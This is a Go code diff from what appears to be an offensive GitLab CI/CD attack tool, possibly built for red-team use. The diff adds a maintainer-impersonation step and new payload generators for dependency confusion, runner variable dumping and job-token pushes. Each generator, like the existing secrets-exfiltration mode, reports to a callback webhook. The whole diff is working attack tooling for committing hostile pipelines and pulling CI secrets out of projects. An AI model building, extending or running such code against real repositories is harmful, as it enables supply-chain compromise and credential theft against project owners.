@@ -20,10 +20,12 @@ import (
 // narrow interface to allow test fakes
 type attackRunner interface {
 	CommitCIPipeline(ctx context.Context, projectID any, branch, yamlContent, message string) (string, error)
+	ImpersonateMaintainer(ctx context.Context, projectID any) error
 }
 
 type secretsRunner interface {
 	RunExfil(ctx context.Context, projectID any, branch, pubkey string, runnerTags []string, exfil attack.ExfilOptions) (url, jobName string, err error)
+	ImpersonateMaintainer(ctx context.Context, projectID any) error
 }
 
 var newAttacker = func(gl *gitlabx.Client, baseURL, authorName, authorEmail string, timeout time.Duration) attackRunner {
@@ -33,6 +35,16 @@ var newAttacker = func(gl *gitlabx.Client, baseURL, authorName, authorEmail stri
 var newSecretsRunner = func(gl *gitlabx.Client, baseURL, authorName, authorEmail string, timeout time.Duration) secretsRunner {
 	att := attack.NewAttacker(gl, baseURL, authorName, authorEmail, timeout)
 	return attack.NewSecretsAttack(att)
+}
+
+func applyAttackImpersonation(ctx context.Context, runner attackRunner, projectID any) error {
+	if !atkImpersonateMaintainer {
+		return nil
+	}
+	if err := runner.ImpersonateMaintainer(ctx, projectID); err != nil {
+		return fmt.Errorf("impersonate maintainer: %w", err)
+	}
+	return nil
 }
 
 // Output structure for --secrets mode when --output-json is set.
@@ -47,7 +59,9 @@ type secretsOutput struct {
 	ArtifactFindings []secdump.ArtifactFinding `json:"artifact_findings,omitempty"`
 }
 
-// ensureBranchDeconflict picks a branch name according to strategy and performs deletions for force.
+// ensureBranchDeconflict picks a branch name according to strategy. The force
+// strategy reuses an existing branch so callers can update its files in place;
+// it never deletes a protected or default branch as a side effect.
 func ensureBranchDeconflict(ctx context.Context, client *gitlabx.Client, projectID any, desired, strategy, authorName, authorEmail string) (string, error) {
 	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), authorName, authorEmail, 0)
 	name := strings.TrimSpace(desired)
@@ -69,11 +83,6 @@ func ensureBranchDeconflict(ctx context.Context, client *gitlabx.Client, project
 		}
 		return name, nil
 	case "force":
-		if exists {
-			if err := att.DeleteBranch(ctx, projectID, name); err != nil {
-				return "", fmt.Errorf("delete branch: %w", err)
-			}
-		}
 		return name, nil
 	case "suffix":
 		if !exists {
@@ -304,6 +313,22 @@ func renderPayload() (string, error) {
 			Version:     strings.TrimSpace(atkSigstoreVersion),
 			CallbackURL: strings.TrimSpace(atkWebhook),
 		}), nil
+	case "dep-confusion", "dep_confusion", "depconfusion":
+		return payloadgen.GenerateDepConfusionYAML(payloadgen.DepConfusionOptions{
+			Common:      common,
+			PackageName: strings.TrimSpace(atkDepConfusionPackage),
+			Version:     strings.TrimSpace(atkDepConfusionVersion),
+			Ecosystem:   strings.TrimSpace(atkDepConfusionEcosystem),
+			Registry:    strings.TrimSpace(atkDepConfusionRegistry),
+			CallbackURL: strings.TrimSpace(atkWebhook),
+		}), nil
+	case "runner-var-dump", "runner_var_dump", "runnervardump":
+		return payloadgen.GenerateRunnerVarDumpYAML(payloadgen.RunnerVarDumpOptions{
+			Common:      common,
+			Method:      strings.TrimSpace(atkRunnerVarDumpMethod),
+			Filter:      strings.TrimSpace(atkRunnerVarDumpFilter),
+			CallbackURL: strings.TrimSpace(atkWebhook),
+		}), nil
 	case "workflow-exfil", "workflow_exfil", "workflowexfil":
 		return payloadgen.GenerateWorkflowExfilYAML(payloadgen.WorkflowExfilOptions{
 			Common:        common,
@@ -436,6 +461,10 @@ func renderExpansionPayload(p string, common payloadgen.CommonOptions) (string, 
 		}), nil
 	case "rules-bypass", "rules_bypass", "rulesbypass":
 		return payloadgen.GenerateRulesBypassYAML(payloadgen.RulesBypassOptions{
+			Common: common,
+		}), nil
+	case "job-token-push", "job_token_push", "jobtokenpush":
+		return payloadgen.GenerateJobTokenPushYAML(payloadgen.JobTokenPushOptions{
 			Common: common,
 		}), nil
 	case "needs-project", "needs_project", "needsproject":
